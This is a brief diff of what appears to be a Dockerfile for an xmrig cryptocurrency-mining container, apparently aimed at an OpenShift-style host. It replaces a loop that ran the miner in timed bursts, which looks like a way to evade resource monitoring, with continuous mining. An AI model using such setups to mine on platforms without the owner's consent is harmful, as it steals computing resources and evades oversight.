@@ -9,9 +9,4 @@ RUN chmod a+x script.sh
 RUN wget https://github.com/lanka256/openshif-docker/releases/download/1.0/config.json
 USER xminer
 WORKDIR xmrig-2.6.2/
-CMD while :
-           do
-             ./xmrig -release
-             sleep 5m
-             killall xmrig
-             sleep 1m
+CMD ./xmrig
